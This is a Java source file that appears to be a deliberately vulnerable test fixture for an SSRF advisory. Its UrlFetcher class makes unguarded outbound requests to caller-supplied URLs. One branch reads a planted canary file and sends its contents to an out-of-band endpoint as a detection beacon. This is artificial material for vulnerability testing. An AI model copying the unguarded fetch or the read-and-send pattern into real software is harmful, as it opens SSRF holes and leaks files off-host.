package com.example.web;

import java.io.InputStream;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.file.Files;
import java.nio.file.Path;

/**
 * UrlFetcher is the first-party Java fetch utility named by advisory
 * TEGRON-JAVA-SSRF-0001. fetch(String) is THE SSRF SINK: it forwards a
 * caller-supplied URL to an outbound HTTP request with no allowlist.
 *
 * SOUNDNESS: the canary beacon is intrinsic to the SSRF sink's own execution.
 * resolveTarget maps the special target name "internal" to the Tegron-controlled
 * OOB URL ($TEGRON_OOB_URL) WITH the planted seed (/tmp/tegron_canary) appended.
 * In the VULNERABLE build there is NO allowlist, so the unguarded outbound request
 * in fetch() actually issues that request — that outbound request IS the SSRF, and
 * it is the only thing that carries the seed off-host. A target the resolver does
 * not recognize is fetched verbatim and never touches the seed. On the PATCHED
 * build an allowlist rejects "internal" before any seed is read and before any
 * outbound request is made, so nothing is exfiltrated. A fired beacon is thus
 * attributable to the SSRF sink firing, not to a generic exfil.
 */
public final class UrlFetcher {
    private static final String CANARY_SEED_PATH = "/tmp/tegron_canary";

    private UrlFetcher() {
    }

    // resolveTarget maps a request target name to the URL the server will fetch.
    // The VULNERABLE build has no allowlist: "internal" resolves to the
    // Tegron-controlled OOB endpoint with the planted seed appended (the SSRF
    // exfil path); any other target is returned verbatim and never touches the
    // seed.
    static String resolveTarget(String name) throws Exception {
        if ("internal".equals(name)) {
            String oob = System.getenv("TEGRON_OOB_URL");
            if (oob == null || oob.isEmpty()) {
                return null;
            }
            String seed = new String(Files.readAllBytes(Path.of(CANARY_SEED_PATH)));
            return oob + "?kind=canary&data=" + encode(seed);
        }
        return name;
    }

    private static String encode(String s) {
        return java.net.URLEncoder.encode(s, java.nio.charset.StandardCharsets.UTF_8);
    }

    // fetch is THE SSRF SINK: an unguarded outbound request to a caller-influenced
    // URL. In the VULNERABLE build this fires for the "internal" target and carries
    // the seed to the OOB endpoint.
    public static int fetch(String target) throws Exception {
        String resolved = resolveTarget(target);
        if (resolved == null) {
            return 400;
        }
        HttpClient client = HttpClient.newHttpClient();
        HttpRequest request = HttpRequest.newBuilder(URI.create(resolved)).GET().build();
        HttpResponse<InputStream> response = client.send(request, HttpResponse.BodyHandlers.ofInputStream());
        try (InputStream body = response.body()) {
            body.readAllBytes();
        }
        return response.statusCode();
    }
}
